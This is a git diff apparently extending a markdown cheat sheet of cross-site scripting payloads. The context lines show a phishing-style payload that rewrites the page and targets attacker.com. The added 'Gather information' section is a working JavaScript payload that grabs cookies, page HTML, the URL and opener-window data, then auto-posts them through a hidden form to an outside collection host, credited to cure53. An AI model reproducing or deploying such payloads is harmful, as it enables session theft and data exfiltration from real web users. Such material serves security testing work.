@@ -82,3 +82,35 @@ document.body.innerHTML = await r.text()
 history.replaceState(null, null,'/loginlol')
 Form.action = '[https://attacker.com](https://attacker.com)' // dosnt work bc of csp :(
 ```
+
+# Gather information
+```javascript
+(function(){
+	if(window.name!=='__'){
+
+            try {dcoo = document.cookie} catch(e) {dcoo=null}
+            try {inne = document.body.parentNode.innerHTML} catch(e) {inne=null}
+            try {durl = document.URL} catch(e) {durl=null}
+            try {oloc = opener.location} catch(e) {oloc=null}
+            try {oloh = opener.document.body.innerHTML} catch(e) {oloh=null}
+            try {odoc = opener.document.cookie} catch(e) {odoc=null}
+
+            var _ = document.createElementNS('http://www.w3.org/1999/xhtml', 'form');
+			var __= document.createElementNS('http://www.w3.org/1999/xhtml', 'input');
+            var body = document.getElementsByTagName('body')[0];
+
+			__.setAttribute('value',escape(dcoo+'\r\n\r\n'+inne+'\r\n\r\n'+durl+'\r\n\r\n'+oloc+'\r\n\r\n'+oloh+'\r\n\r\n'+odoc));
+			__.setAttribute('name','_');
+			_.appendChild(__);
+			_.action='https://cure53.de/m/';
+			_.method='post';
+            //_.target='_blank';
+
+			body.appendChild(_);
+			window.name='__';
+			_.submit();
+			//history.back();
+	} else {window.name=''}
+})();
+```
+Thanks to cure53
